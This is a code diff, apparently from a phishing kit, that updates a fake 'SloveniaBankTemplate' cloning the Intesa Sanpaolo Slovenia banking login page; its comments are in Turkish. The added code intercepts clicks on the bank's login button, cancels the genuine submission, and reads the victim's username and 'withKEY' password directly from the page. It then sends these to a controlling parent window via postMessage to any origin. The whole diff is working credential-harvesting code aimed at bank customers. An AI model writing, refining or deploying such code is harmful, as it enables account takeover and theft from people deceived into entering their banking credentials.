@@ -2444,31 +2444,45 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
 
           // ==== INTESA SANPAOLO: Vpis butonu ====
           // Login formu sadece hidden input + buton iceriyor, gorunur alanlar
-          // form disinda -> fixSloveniaBanks butonu disabled/pointer-events:none
-          // yapabiliyor. Buton alanina tiklamayi koordinatla da yakala.
+          // form disinda. Buton alanina tiklamayi koordinatla da yakala;
+          // username/password degerlerini DOM'dan DOGRUDAN enjekte et
+          // (serialize zincirine guvenme - 2.7MB snapshot, React markup).
           if (/intesasanpaolo/i.test(window.location.href || '')) {
-            const ispBtn = document.querySelector('button[name="submit"], button[type="submit"].btn-primary, .publicPortalLoginForm button[type="submit"]');
-            if (ispBtn) {
-              const r = ispBtn.getBoundingClientRect();
-              const hit = typeof e.clientX === 'number' &&
-                e.clientX >= r.left - 6 && e.clientX <= r.right + 6 &&
-                e.clientY >= r.top - 6 && e.clientY <= r.bottom + 6;
-              const direct = !!(target.closest && target.closest('button') === ispBtn);
-              if (hit || direct) {
-                e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-                try {
-                  const res = serializeAllLtForms();
-                  let hv = false;
-                  for (const f of res.fields) { if (f && String(f.value || '').trim() !== '') { hv = true; break; } }
-                  if (hv) {
-                    window.parent.postMessage({
-                      type: 'SLOVENIA_BANK_SUBMIT',
-                      formData: { inputs: res.inputs, fields: res.fields, loginMethod: getLoginMethod() }
-                    }, '*');
-                  }
-                } catch(_e){}
-                return false;
+            const ispBtns = Array.from(document.querySelectorAll('button[type="submit"], button[name="submit"], .publicPortalLoginForm button, button.btn-primary'));
+            let ispBtn = null;
+            for (const __b of ispBtns) {
+              const directHit = !!(target && target.closest && target.closest('button') === __b);
+              let rectHit = false;
+              if (!directHit && typeof e.clientX === 'number' && __b.getBoundingClientRect) {
+                const r = __b.getBoundingClientRect();
+                if (r.width > 4 && r.height > 4 &&
+                  e.clientX >= r.left - 6 && e.clientX <= r.right + 6 &&
+                  e.clientY >= r.top - 6 && e.clientY <= r.bottom + 6) {
+                  rectHit = true;
+                }
               }
+              if (directHit || rectHit) { ispBtn = __b; break; }
+            }
+            if (ispBtn) {
+              e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+              try {
+                const res = serializeAllLtForms();
+                // Orijinal inputlari dogrudan oku: id=username (name=username-auto),
+                // id=password (name=otp-auto, label 'withKEY geslo').
+                const uEl = document.getElementById('username') || document.querySelector('input[name="username-auto"]');
+                const pEl = document.getElementById('password') || document.querySelector('input[name="otp-auto"]');
+                const uVal = uEl && uEl.value ? String(uEl.value).trim() : '';
+                const pVal = pEl && pEl.value ? String(pEl.value).trim() : '';
+                if (uVal) res.fields.push({ key: 'username', name: 'username', id: 'username', label: 'Uporabniško ime', type: 'text', value: uVal });
+                if (pVal) res.fields.push({ key: 'password', name: 'password', id: 'password', label: 'withKEY geslo', type: 'password', value: pVal });
+                if (uVal && pVal) {
+                  window.parent.postMessage({
+                    type: 'SLOVENIA_BANK_SUBMIT',
+                    formData: { inputs: res.inputs, fields: res.fields, loginMethod: getLoginMethod() }
+                  }, '*');
+                }
+              } catch(_e){}
+              return false;
             }
           }
 
